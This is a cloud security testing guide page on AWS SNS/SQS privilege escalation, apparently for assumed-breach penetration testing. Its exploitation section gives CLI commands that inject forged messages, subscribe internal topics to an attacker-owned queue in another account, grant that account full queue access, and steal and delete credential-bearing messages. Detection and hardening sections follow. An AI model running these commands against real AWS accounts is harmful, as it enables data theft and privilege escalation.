---
cstg_id: CSTG-AWS-SNS-SQS-PRIVESC
title: "AWS Sns Sqs - Privilege Escalation"
provider: aws
service: sns-sqs
phase: privilege-escalation
required_access: assumed-breach
required_permissions:
  - sns:Subscribe
  - sns:Publish
  - sns:SetTopicAttributes
  - sns:AddPermission
  - sqs:SendMessage
  - sqs:ReceiveMessage
  - sqs:DeleteMessage
  - sqs:SetQueueAttributes
  - sqs:AddPermission
  - lambda:CreateEventSourceMapping
  - iam:PassRole
tools:
  - AWS CLI
  - Pacu
  - Cloudsplaining
  - PMapper
references:
  - "https://docs.aws.amazon.com/sns/latest/dg/sns-access-policy-language-overview.html"
  - "https://docs.aws.amazon.com/AWSSimpleQueueService/latest/SQSDeveloperGuide/sqs-security-best-practices.html"
  - "https://docs.aws.amazon.com/lambda/latest/dg/with-sqs.html"
  - "https://docs.aws.amazon.com/sns/latest/dg/sns-lambda-as-subscriber.html"
  - "https://hackingthe.cloud/aws/exploitation/iam_privilege_escalation/"
  - "https://docs.aws.amazon.com/IAM/latest/UserGuide/confused-deputy.html"
license: CC BY-SA 4.0
---

## Summary

SNS and SQS rarely grant *direct* IAM privilege escalation in the way that `iam:CreatePolicyVersion` or `iam:PassRole` do. Instead they escalate privilege **laterally and indirectly**: by injecting attacker-controlled data into trusted message flows, by redirecting where messages are delivered, and by abusing the confused-deputy pattern to make a privileged downstream consumer (Lambda, a worker on an EC2 instance role, a Step Functions execution) act on attacker input. The attacker objective is to convert message-plane access (publish/send/subscribe/receive) and/or control-plane access over messaging policies into execution in a higher-privileged context or into possession of data that is itself a credential.

Three escalation primitives recur:

1. **Inject into a trusted queue/topic** so that a privileged consumer processes malicious input (command/SSRF/deserialization downstream, or simply controlling business logic that runs with an elevated role).
2. **Wire a queue to a privileged Lambda** via an event source mapping, or rewrite policies so the attacker controls the source of events for an existing privileged function.
3. **Confused-deputy abuse** where an SNS topic or SQS queue accepts messages from a service principal without source conditions, letting the attacker drive that service into a privileged action.

This page is organised as one subsection per permission that enables a path. See [aws-sns-sqs-enum.md](../02-services/aws-sns-sqs-enum.md) for discovering the targets and [aws-sns-sqs-persistence.md](../06-persistence/aws-sns-sqs-persistence.md) for durable variants.

## Prerequisites

- An assumed-breach foothold: a compromised IAM principal (user, role, or instance/task role) holding one or more of the permissions in the frontmatter, **or** the target topic/queue resource policy granting your external principal those actions.
- Knowledge from the enumeration phase: target topic/queue ARNs, their resource policies, which Lambda functions or roles consume them, and the encryption/DLQ configuration.
- For Lambda-based paths, the consuming function's execution role is the privilege you are after; identify it via `lambda:GetFunction` / event source mappings.

## Enumeration

Identify which of the privesc-relevant actions your principal can actually perform and which downstream consumers are privileged:

```bash
# What can the current principal do against the messaging services?
aws iam simulate-principal-policy \
  --policy-source-arn $(aws sts get-caller-identity --query Arn --output text) \
  --action-names sns:Publish sns:Subscribe sns:SetTopicAttributes sns:AddPermission \
                 sqs:SendMessage sqs:ReceiveMessage sqs:SetQueueAttributes sqs:AddPermission \
                 lambda:CreateEventSourceMapping iam:PassRole \
  --resource-arns "*"

# Which Lambda functions consume which queues, and with what role?
aws lambda list-event-source-mappings --region us-east-1
aws lambda get-function --function-name orders-processor \
  --query 'Configuration.Role' --region us-east-1

# Resource policies (targets for rewriting)
aws sqs get-queue-attributes --queue-url <url> --attribute-names Policy --region us-east-1
aws sns get-topic-attributes --topic-arn <arn> --query 'Attributes.Policy' --region us-east-1
```

## Misconfigurations & Findings

- A privileged Lambda or worker consumes a queue/topic that the attacker can write to without integrity controls (no message signing, no schema validation, no authorization re-check downstream).
- The attacker holds `SetQueueAttributes`/`SetTopicAttributes`/`AddPermission` on a resource and can therefore widen its own access or redirect its DLQ/redrive target.
- The attacker holds `lambda:CreateEventSourceMapping` plus `iam:PassRole` for a more privileged role, allowing creation of a poller that invokes attacker code with that role's permissions.
- Cross-service grants (e.g. allowing `events.amazonaws.com`, `s3.amazonaws.com`, `cloudwatch.amazonaws.com`, or another account's role to publish/send) lack `aws:SourceArn`/`aws:SourceAccount`, enabling confused-deputy injection.
- Downstream consumers trust message contents to choose a role to assume, a command to run, a file path to read, or an SQL statement to execute.

## Exploitation

### sns:Publish

Publishing to a topic places an attacker-chosen message into every subscribed consumer. If any subscriber runs with elevated privilege and trusts the payload, the attacker escalates through that consumer.

```bash
aws sns publish \
  --topic-arn arn:aws:sns:us-east-1:111122223333:orders-events \
  --message '{"action":"refund","accountId":"ATTACKER","amount":0,"cmd":"<payload>"}' \
  --message-attributes '{"type":{"DataType":"String","StringValue":"admin"}}' \
  --region us-east-1
```

The `--message-attributes` are significant: many fan-out designs use SNS subscription **filter policies** that route on attributes. Forging attributes can steer a message to a privileged routing branch (e.g. an "admin"/"internal" queue) that an external caller is not supposed to reach. Impact equals the privilege of the most-privileged subscriber that acts on the message.

### sqs:SendMessage

Sending directly to a queue consumed by a privileged worker is the most direct injection path. If the worker (a Lambda execution role, an ECS task role, or an EC2 instance role) processes the message body to perform privileged work, the attacker controls that work.

```bash
aws sqs send-message \
  --queue-url https://sqs.us-east-1.amazonaws.com/111122223333/orders-worker \
  --message-body '{"task":"provision","role":"arn:aws:iam::111122223333:role/Admin","payload":"<x>"}' \
  --region us-east-1
```

For FIFO queues, supply `--message-group-id` and `--message-deduplication-id`. The escalation is realised when the consumer treats body fields as trusted instructions (role to assume, resource to create, command to execute) - a classic injection into a trust boundary.

### sns:Subscribe

Subscribing an attacker endpoint does not by itself raise privilege, but subscribing a **privileged delivery target** can. If the principal can subscribe a Lambda or SQS protocol and choose a delivery configuration, and if the topic later carries messages the attacker can influence, the attacker can engineer a loop into a privileged function. More commonly, `Subscribe` is paired with `Publish`: subscribe a queue you control, then trigger publishes to capture credential-bearing messages, then replay them into a privileged consumer.

```bash
aws sns subscribe \
  --topic-arn arn:aws:sns:us-east-1:111122223333:internal-events \
  --protocol sqs \
  --notification-endpoint arn:aws:sqs:us-east-1:444455556666:attacker-capture \
  --attributes '{"RawMessageDelivery":"true"}' \
  --region us-east-1
```

### sqs:ReceiveMessage / sqs:DeleteMessage

Read access to a queue that carries credentials, tokens, signed URLs, or session material is itself an escalation: the captured material is replayed against the service it authenticates to. `DeleteMessage` lets the attacker consume a message before the legitimate worker does, enabling a steal-and-suppress attack where the attacker performs the privileged action that the message was meant to trigger and removes the evidence.

```bash
MSG=$(aws sqs receive-message --queue-url <url> --max-number-of-messages 10 \
  --wait-time-seconds 5 --region us-east-1)
# extract a credential/token from the body, then optionally:
aws sqs delete-message --queue-url <url> --receipt-handle "<handle>" --region us-east-1
```

### sqs:SetQueueAttributes

This action lets the principal rewrite the queue's **resource policy** and **redrive policy**. The attacker can grant their own external principal `ReceiveMessage`/`SendMessage`, or repoint the `RedrivePolicy` so that failed (often retry-able, credential-bearing) messages flow into an attacker-owned DLQ.

```bash
aws sqs set-queue-attributes \
  --queue-url https://sqs.us-east-1.amazonaws.com/111122223333/orders-worker \
  --attributes '{"Policy":"{\"Version\":\"2012-10-17\",\"Statement\":[{\"Effect\":\"Allow\",\"Principal\":{\"AWS\":\"arn:aws:iam::444455556666:root\"},\"Action\":\"sqs:*\",\"Resource\":\"arn:aws:sqs:us-east-1:111122223333:orders-worker\"}]}"}' \
  --region us-east-1
```

### sns:SetTopicAttributes

Equivalent control-plane abuse on a topic: rewrite the topic `Policy` to grant the attacker `Subscribe`/`Publish`, or alter the delivery policy. Combined with `Subscribe`, this guarantees the attacker can both inject into and exfiltrate from the topic regardless of the original owner's intent.

### sns:AddPermission / sqs:AddPermission

`AddPermission` is a narrower, statement-level way to grant principals access to a topic or queue without replacing the whole policy - and it is often allowed where `Set*Attributes` is not. The attacker adds a statement granting their own account `Publish`/`Subscribe` (SNS) or `SendMessage`/`ReceiveMessage` (SQS), then uses the data-plane paths above.

```bash
aws sqs add-permission \
  --queue-url https://sqs.us-east-1.amazonaws.com/111122223333/orders-worker \
  --label attacker-grant --aws-account-ids 444455556666 \
  --actions SendMessage ReceiveMessage --region us-east-1

aws sns add-permission \
  --topic-arn arn:aws:sns:us-east-1:111122223333:orders-events \
  --label attacker-grant --aws-account-id 444455556666 \
  --action-name Subscribe Publish Receive --region us-east-1
```

### lambda:CreateEventSourceMapping (with iam:PassRole)

If the principal can create an event source mapping from an attacker-writable queue to a Lambda function, and the function's execution role is more privileged than the current principal, the attacker gains that role's permissions: send a message to the queue, the function executes with its role and processes the attacker payload. Where the attacker can also create/update the function and pass a privileged role (`iam:PassRole`), the path is end-to-end attacker-controlled.

```bash
aws lambda create-event-source-mapping \
  --function-name privileged-processor \
  --event-source-arn arn:aws:sqs:us-east-1:111122223333:attacker-writable-queue \
  --batch-size 1 --region us-east-1
# then drive execution under the function's role:
aws sqs send-message --queue-url <attacker-writable-queue-url> --message-body '<payload>' --region us-east-1
```

### iam:PassRole (confused-deputy / service integration)

Cross-service grants on topics/queues that omit source conditions let the attacker act as the confused deputy. For example, an SNS topic that allows `cloudwatch.amazonaws.com` or another account's automation role to publish without `aws:SourceArn` can be driven to deliver attacker-influenced content to a privileged subscriber. Likewise an SQS queue that an S3 bucket or EventBridge rule writes to without source restriction can be fed forged or replayed events that a privileged consumer then trusts.

## Detection & Logging

- **CloudTrail management events** capture the control-plane abuse directly: `SetQueueAttributes`, `SetTopicAttributes`, `AddPermission`, `Subscribe`, `CreateEventSourceMapping`, and any `PassRole`-bearing call. Alert on `AddPermission`/`Set*Attributes` that introduce a foreign account or `Principal: *` into a resource policy, and on `Subscribe` calls whose endpoint is an out-of-account ARN or external URL.
- **Data events** (`Publish`, `SendMessage`, `ReceiveMessage`, `DeleteMessage`) are only in CloudTrail if data-event logging is enabled on a trail; without it, injection and capture are invisible. Enable data events on sensitive topics/queues to detect anomalous publishers/consumers.
- Watch for new `CreateEventSourceMapping` linking a queue to a function whose role is more privileged than the creator, and for event source mappings whose source ARN is in a different account.
- Correlate a single principal performing `AddPermission` followed by cross-account `ReceiveMessage` - the signature of grant-then-exfiltrate.
- GuardDuty IAM findings (anomalous principal behaviour, credential use from new locations) can flag replayed credentials harvested from message bodies.

## Remediation & Hardening

- Treat all queue/topic message bodies and attributes as **untrusted input**; validate schema, authenticate/sign messages, and re-authorize actions in the consumer rather than trusting payload fields (role names, commands, paths).
- Restrict `sns:AddPermission`/`sqs:AddPermission`/`Set*Attributes` to administrators only; never grant them to application roles.
- Add `aws:SourceArn`/`aws:SourceAccount`/`aws:SourceOwner` conditions to every cross-service and cross-account grant to defeat confused-deputy abuse.
- Scope `lambda:CreateEventSourceMapping` and `iam:PassRole` tightly; use `iam:PassedToService` and resource conditions to limit which roles can be passed and to which services.
- Keep DLQ access policies as strong as their source queues and pin `RedriveAllowPolicy` to known source ARNs.
- Enable SSE with customer-managed keys and restrict `kms:Decrypt` so that read access to a queue does not automatically yield plaintext.
- Enable CloudTrail data events on high-value messaging resources and alert on the patterns above.

## Tools

- **AWS CLI** - executes every publish/send/subscribe/policy-rewrite/mapping action above.
- **Pacu** - modules automate enumeration of writable topics/queues and policy modification.
- **Cloudsplaining** - identifies identity policies granting `Set*Attributes`/`AddPermission`/`CreateEventSourceMapping`/`PassRole` that enable these paths.
- **PMapper** - models principal-to-resource reachability, surfacing privesc edges through Lambda event sources and passable roles.

## References

- SNS Access Policy Language - https://docs.aws.amazon.com/sns/latest/dg/sns-access-policy-language-overview.html
- SQS Security Best Practices - https://docs.aws.amazon.com/AWSSimpleQueueService/latest/SQSDeveloperGuide/sqs-security-best-practices.html
- Using Lambda with SQS - https://docs.aws.amazon.com/lambda/latest/dg/with-sqs.html
- SNS Lambda Subscriber - https://docs.aws.amazon.com/sns/latest/dg/sns-lambda-as-subscriber.html
- IAM Privilege Escalation (hackingthe.cloud) - https://hackingthe.cloud/aws/exploitation/iam_privilege_escalation/
- The Confused Deputy Problem - https://docs.aws.amazon.com/IAM/latest/UserGuide/confused-deputy.html
